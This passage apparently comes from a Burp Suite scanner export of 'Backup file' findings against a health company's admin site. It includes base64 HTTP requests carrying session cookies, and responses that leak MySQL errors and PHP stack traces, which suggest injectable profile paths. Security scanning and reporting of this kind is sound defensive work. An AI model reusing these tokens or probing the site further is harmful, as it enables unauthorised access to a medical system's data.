eVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnKHRoaXJkIGNvcHkpJyBhdCBsaW5lIDEgaW4gL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA6MjQKU3RhY2sgdHJhY2U6CiMwIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwKDI0KTogbXlzcWxpLSZndDtxdWVyeSgnU0VMRUNUICogZnJvbSB1Li4uJykKIzEgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS9tb2RlbHMvVXNlci5waHAoMTk0KTogRGJVdGlsOjpnZXRTZWxlY3RSZXN1bHQoT2JqZWN0KG15c3FsaSksICdTRUxFQ1QgKiBmcm9tIHUuLi4nKQojMiAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2NvbnRyb2xsZXIvVXNlclByb2ZpbGVDb250cm9sbGVyLnBocCg5Nik6IFVzZXI6OmdldCgnMzk5ICh0aGlyZCBjb3B5Li4uJykKIzMgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9pbmRleC5waHAoMTAzKTogVXNlclByb2ZpbGVDb250cm9sbGVyLSZndDtzYXZlRW50aXR5KCczOTkgKHRoaXJkIGNvcHkuLi4nLCAnVXNlclByb2ZpbGUnLCBBcnJheSwgQXJyYXkpCiM0IHttYWlufQogIHRocm93biBpbiA8Yj4vdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocDwvYj4gb24gbGluZSA8Yj4yNDwvYj48YnIgLz4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvdmhmJTIwKHRoaXJkJTIwY29weSkgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L2phdmFzY3JpcHQsICovKjsgcT0wLjAxDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0czsgc2NyZWVuV2lkdGg9MTM2ODsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVg7IEFXU0FMQkNPUlM9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WA0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCZlbnRyaWVzUGVyUGFnZT01MA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyMyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzQxDQpTZXQtQ29va2llOiBBV1NBTEI9Ymk2TWZoaDNwWXlWbHZDZWhNQndnMzMrbTNLRTd3NkFaS3NPMU5Yc2xUWnphVi9KUUE5cDh6ZCtsYkhMQ2V3UUV2ckw2eWZlRDFjdll4bjRDVEJuZk9WMkUrWHYxYmFMUERZSDdXTCt1OE13am1iSlVNZE1sdlhlTXRmaTsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjIzIEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPWJpNk1maGgzcFl5Vmx2Q2VoTUJ3ZzMzK20zS0U3dzZBWktzTzFOWHNsVFp6YVYvSlFBOXA4emQrbGJITENld1FFdnJMNnlmZUQxY3ZZeG40Q1RCbmZPVjJFK1h2MWJhTFBEWUg3V0wrdThNd2ptYkpVTWRNbHZYZU10Zmk7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyMyBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogSW5jb3JyZWN0IHBhcmFtZXRlcnMgaW4gdGhlIGNhbGwgdG8gc3RvcmVkIGZ1bmN0aW9uIGB2aGZgIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJ3ZoZiAodGhpcmQgY29weS4uLicpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaW5kZXgucGhwKDEwMyk6IFVzZXJQcm9maWxlQ29udHJvbGxlci0mZ3Q7c2F2ZUVudGl0eSgndmhmICh0aGlyZCBjb3B5Li4uJywgJ1VzZXJQcm9maWxlJywgQXJyYXksIEFycmF5KQojNCB7bWFpbn0KICB0aHJvd24gaW4gPGI+L3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA8L2I+IG9uIGxpbmUgPGI+MjQ8L2I+PGJyIC8+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3181386431827546112</serialNumber>
    <type>6291672</type>
    <name><![CDATA[Backup file]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399%20(fourth%20copy)]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li><li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5JTIwKGZvdXJ0aCUyMGNvcHkpIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHNjcmVlbldpZHRoPTEzNjg7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYOyBBV1NBTEJDT1JTPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVgNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOA0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCkNvbnRlbnQtTGVuZ3RoOiA3NQ0KDQpTYXZlPVNhdmUmZmlyc3ROYW1lPVlZWSZsYXN0TmFtZT1jeXBhcnRhJnBob25lPTAwMDAwMDAwMDAmZW50cmllc1BlclBhZ2U9NTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyMyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODQzDQpTZXQtQ29va2llOiBBV1NBTEI9Mm1ZQ3VrRFBpL3ZKam9vY2RBcFNrcCt0NEtueE9LSE0yS1g2WjJKdXJ0dXgyeTdJeDFpeGVlblFWeDJiZ2VqdFBPZGRzN3V1eWZGVW91MGh3RTJpRlNleW9JSjRoSXg3QzNycTB4U3hLTVVPb3VpQTVZUDlKY21lZDJNNDsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjIzIEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPTJtWUN1a0RQaS92Smpvb2NkQXBTa3ArdDRLbnhPS0hNMktYNloySnVydHV4Mnk3SXgxaXhlZW5RVngyYmdlanRQT2Rkczd1dXlmRlVvdTBod0UyaUZTZXlvSUo0aEl4N0MzcnEweFN4S01VT291aUE1WVA5SmNtZWQyTTQ7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyMyBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnKGZvdXJ0aCBjb3B5KScgYXQgbGluZSAxIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJzM5OSAoZm91cnRoIGNvcC4uLicpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaW5kZXgucGhwKDEwMyk6IFVzZXJQcm9maWxlQ29udHJvbGxlci0mZ3Q7c2F2ZUVudGl0eSgnMzk5IChmb3VydGggY29wLi4uJywgJ1VzZXJQcm9maWxlJywgQXJyYXksIEFycmF5KQojNCB7bWFpbn0KICB0aHJvd24gaW4gPGI+L3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA8L2I+IG9uIGxpbmUgPGI+MjQ8L2I+PGJyIC8+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvb2JsJTIwKGZvdXJ0aCUyMGNvcHkpIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHNjcmVlbldpZHRoPTEzNjg7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYOyBBV1NBTEJDT1JTPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVgNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOA0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCkNvbnRlbnQtTGVuZ3RoOiA3NQ0KDQpTYXZlPVNhdmUmZmlyc3ROYW1lPVlZWSZsYXN0TmFtZT1jeXBhcnRhJnBob25lPTAwMDAwMDAwMDAmZW50cmllc1BlclBhZ2U9NTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyNCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzQxDQpTZXQtQ29va2llOiBBV1NBTEI9VVBzL1MrcGFhS2FESlNTd2Rlb2hoNEY2dS9nMEViTGpZbXRubnRWWmxYQkN3OVdvZ2xNNGRNZ1NhMlZZVWp5TXZUcjJPMkN6QzcybWxKR1JMdlVva0FCYWpVV3JxVm9tTXQyTC9nd2JuWkFpUHRDMmNJYjBONkk1eGhhTjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjIzIEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPVVQcy9TK3BhYUthREpTU3dkZW9oaDRGNnUvZzBFYkxqWW10bm50VlpsWEJDdzlXb2dsTTRkTWdTYTJWWVVqeU12VHIyTzJDekM3Mm1sSkdSTHZVb2tBQmFqVVdycVZvbU10MkwvZ3diblpBaVB0QzJjSWIwTjZJNXhoYU47IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyMyBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogSW5jb3JyZWN0IHBhcmFtZXRlcnMgaW4gdGhlIGNhbGwgdG8gc3RvcmVkIGZ1bmN0aW9uIGBvYmxgIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJ29ibCAoZm91cnRoIGNvcC4uLicpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaW5kZXgucGhwKDEwMyk6IFVzZXJQcm9maWxlQ29udHJvbGxlci0mZ3Q7c2F2ZUVudGl0eSgnb2JsIChmb3VydGggY29wLi4uJywgJ1VzZXJQcm9maWxlJywgQXJyYXksIEFycmF5KQojNCB7bWFpbn0KICB0aHJvd24gaW4gPGI+L3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA8L2I+IG9uIGxpbmUgPGI+MjQ8L2I+PGJyIC8+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4682537320013385728</serialNumber>
    <type>6291672</type>
    <name><![CDATA[Backup file]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399%20(2nd%20copy)]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li><li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5JTIwKDJuZCUyMGNvcHkpIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHNjcmVlbldpZHRoPTEzNjg7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYOyBBV1NBTEJDT1JTPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVgNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOA0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCkNvbnRlbnQtTGVuZ3RoOiA3NQ0KDQpTYXZlPVNhdmUmZmlyc3ROYW1lPVlZWSZsYXN0TmFtZT1jeXBhcnRhJnBob25lPTAwMDAwMDAwMDAmZW50cmllc1BlclBhZ2U9NTA=]]></request>
